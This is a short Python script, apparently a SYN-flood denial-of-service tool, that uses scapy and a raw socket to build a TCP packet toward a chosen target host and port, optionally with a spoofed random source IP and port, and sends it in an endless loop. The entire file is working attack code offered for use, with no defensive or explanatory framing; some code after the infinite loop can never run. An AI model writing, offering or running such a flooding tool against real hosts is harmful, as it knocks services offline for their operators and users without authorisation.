from scapy.all import IP, TCP, RandIP, RandShort, Raw
from time import perf_counter
from argparse import ArgumentParser
from socket import socket, AF_INET, SOCK_RAW, IPPROTO_TCP

def parse ():
    parser = ArgumentParser()
    parser.add_argument("target", help="Target IP or hostname.")
    parser.add_argument("--dport", "-p", help="Destination port.", default=80, type=int)
    parser.add_argument("--source", "-s", help="Source IP.", default=None)
    parser.add_argument("--sport", "-P", help="Source port.", default=None, type=int)
    parser.add_argument("--data", "-d", help="Additional data", default=None)
    return parser.parse_args()
    
def synflood (target, dport, source, sport, data=None):
    packet = IP(dst=target, src=source)/TCP(dport=dport, sport=sport)
    if data:
    	packet = packet/Raw(data.encode())
    packet = bytes(packet)
    
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
    start_at = perf_counter()
    
    while True:
        sock.sendto(packet, (target, 0))
    
    end_at = perf_counter()
    diff_time = end_at - start_at
    
    return diff_time
    
def launch ():
    parser = parse()
    run = True
    
    while run:
        try:
            synflood(parser.target, parser.dport, parser.source or RandIP(), parser.sport or RandShort(), parser.data)
        except OSError:
            print("OSError...")
        except KeyboardInterrupt:
            run = False
    
if __name__ == "__main__":
    launch()
